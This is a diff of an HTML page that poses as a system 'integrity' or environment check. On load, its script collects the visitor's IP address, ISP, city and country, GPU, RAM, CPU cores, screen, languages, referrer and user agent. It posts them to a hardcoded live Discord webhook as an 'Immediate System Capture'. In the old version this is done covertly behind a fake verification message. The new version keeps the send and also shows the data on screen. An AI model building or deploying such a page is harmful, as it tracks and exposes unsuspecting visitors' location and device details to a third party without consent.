@@ -2,65 +2,156 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Environment Log</title>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            color: #33ff33; 
+            font-family: 'Courier New', monospace; 
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+        .terminal {
+            background: #111;
+            border: 1px solid #33ff33;
+            box-shadow: 0 0 15px rgba(51, 255, 51, 0.2);
+            padding: 25px;
+            max-width: 650px;
+            width: 100%;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        h2 { 
+            margin-top: 0;
+            font-size: 1.2rem;
+            border-bottom: 1px dashed #33ff33;
+            padding-bottom: 10px;
+        }
+        .cursor { 
+            border-right: 2px solid #33ff33; 
+            animation: blink 1s infinite; 
+        }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+        
+        .log-output {
+            text-align: left;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            white-space: pre-wrap;
+        }
+        .status {
+            color: #ffb700;
+        }
+        .success {
+            color: #00ffcc;
+        }
+    </style>
     <script>
-        // IIFE starts IMMEDIATELY before page renders
         (async function() {
-            try {
-                // 1. Start Geo/IP Fetching ASAP
-                const geoPromise = fetch("https://ipwho.is/").then(r => r.json());
-
-                // 2. Immediate Hardware & Browser Probe
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+            // Wait for DOM to load so we can write to the page
+            window.addEventListener('DOMContentLoaded', async () => {
+                const output = document.getElementById('output');
                 
-                const systemData = {
-                    ua: navigator.userAgent,
-                    ram: navigator.deviceMemory || "Unknown",
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
-                    lang: navigator.languages ? navigator.languages.join(", ") : navigator.language,
-                    ref: document.referrer || "Direct Link",
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
-                };
+                try {
+                    // 1. Start Geo/IP Fetching
+                    const geoPromise = fetch("https://ipwho.is/").then(r => r.json());
 
-                // 3. Wait for Geo data to finish
-                const geo = await geoPromise;
+                    // 2. Immediate Hardware & Browser Probe
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                    
+                    const systemData = {
+                        ua: navigator.userAgent,
+                        ram: navigator.deviceMemory || "Unknown",
+                        cores: navigator.hardwareConcurrency || "Unknown",
+                        screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
+                        lang: navigator.languages ? navigator.languages.join(", ") : navigator.language,
+                        ref: document.referrer || "Direct Link",
+                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
+                    };
 
-                // 4. Send to Webhook instantly
-                await fetch("https://discord.com/api/webhooks/1506632939642028193/A8wwhWtyzDM4AmZpIaPFslbRSyKzLzeMxVJd8zMt8dqKDYD87jgPQhpRTXgtqGspvZlX", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "🚨 Immediate System Capture",
-                            color: 0, // Black
-                            fields: [
-                                { name: "🌐 Network/IP", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.connection.isp}\n**Type:** ${geo.type}`, inline: false },
-                                { name: "📍 Location", value: `**City:** ${geo.city}\n**Country:** ${geo.country} ${geo.flag.emoji}\n**Timezone:** ${systemData.tz}`, inline: true },
-                                { name: "💻 Hardware", value: `**GPU:** ${gpu}\n**RAM:** ${systemData.ram}GB\n**CPU:** ${systemData.cores} Cores`, inline: true },
-                                { name: "🖥️ Browser/OS", value: `**Screen:** ${systemData.screen}\n**Cookies:** ${systemData.cookies}\n**Lang:** ${systemData.lang}`, inline: false },
-                                { name: "🔗 Origin", value: `**Ref:** ${systemData.ref}`, inline: true },
-                                { name: "📝 User Agent", value: `\`${systemData.ua}\``, inline: false }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            } catch (e) { }
+                    // 3. Wait for Geo data to finish
+                    const geo = await geoPromise;
+
+                    // Fix ipwho.is data access safely
+                    const ipAddress = geo.ip || "Unknown";
+                    const ispName = geo.connection && geo.connection.isp ? geo.connection.isp : "Unknown";
+                    const connectionType = geo.type || "Unknown";
+                    const cityName = geo.city || "Unknown";
+                    const countryName = geo.country || "Unknown";
+                    const countryFlag = geo.flag && geo.flag.emoji ? geo.flag.emoji : "";
+
+                    // 4. Update Screen Output Immediately
+                    output.innerHTML = `
+<span class="success">[✓] ENVIRONMENT RESOLVED SIMULCAST</span>
+--------------------------------------------------
+<span class="success">🌐 NETWORK DATA:</span>
+  <b>IP Address:</b> ${ipAddress}
+  <b>ISP Provider:</b> ${ispName}
+  <b>Conn Type:</b>    ${connectionType}
+
+<span class="success">📍 LOCATION DATA:</span>
+  <b>Coordinates:</b> ${cityName}, ${countryName} ${countryFlag}
+  <b>Timezone:</b>    ${systemData.tz}
+
+<span class="success">💻 HARDWARE & SYSTEM:</span>
+  <b>GPU Core:</b>    ${gpu}
+  <b>Device RAM:</b>  ${systemData.ram} GB
+  <b>CPU Cores:</b>   ${systemData.cores} Threads
+  <b>Resolution:</b>  ${systemData.screen}
+  <b>Language:</b>    ${systemData.lang}
+  <b>Cookies:</b>     ${systemData.cookies}
+                    `;
+
+                    // 5. Send to Webhook (Replace placeholder with your active URL)
+                    const webhookUrl = "https://discord.com/api/webhooks/1506632939642028193/A8wwhWtyzDM4AmZpIaPFslbRSyKzLzeMxVJd8zMt8dqKDYD87jgPQhpRTXgtqGspvZlX";
+                    
+                    if (webhookUrl && webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+                        await fetch(webhookUrl, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "🚨 Immediate System Capture",
+                                    color: 65280, // Green hex 0x00FF00 converted to decimal
+                                    fields: [
+                                        { name: "🌐 Network/IP", value: `**IP:** ${ipAddress}\n**ISP:** ${ispName}\n**Type:** ${connectionType}`, inline: false },
+                                        { name: "📍 Location", value: `**City:** ${cityName}\n**Country:** ${countryName} ${countryFlag}\n**Timezone:** ${systemData.tz}`, inline: true },
+                                        { name: "💻 Hardware", value: `**GPU:** ${gpu}\n**RAM:** ${systemData.ram}GB\n**CPU:** ${systemData.cores} Cores`, inline: true },
+                                        { name: "🖥️ Browser/OS", value: `**Screen:** ${systemData.screen}\n**Cookies:** ${systemData.cookies}\n**Lang:** ${systemData.lang}`, inline: false },
+                                        { name: "🔗 Origin", value: `**Ref:** ${systemData.ref}`, inline: true },
+                                        { name: "📝 User Agent", value: `\`\`\`${systemData.ua}\`\`\``, inline: false }
+                                    ],
+                                    timestamp: new Date().toISOString()
+                                }]
+                            })
+                        });
+                    }
+
+                } catch (e) {
+                    output.innerHTML = `<span style="color: #ff3333;">[!] Execution Error: ${e.message}</span>`;
+                }
+            });
         })();
     </script>
-    <title>Checking Integrity...</title>
-    <style>
-        body { background: #000; color: #33ff33; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
-        .cursor { border-right: 2px solid #33ff33; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
-    </style>
 </head>
 <body>
-    <h2>[ ACCESSING SYSTEM DATA <span class="cursor"></span> ]</h2>
-    <p>Please wait while your environment is verified...</p>
+    <div class="terminal">
+        <h2>[ ACCESSING SYSTEM DATA <span class="cursor"></span> ]</h2>
+        <div id="output" class="log-output">
+            <span class="status">[...] Pinging geo servers and analyzing hardware components...</span>
+        </div>
+    </div>
 </body>
 </html>
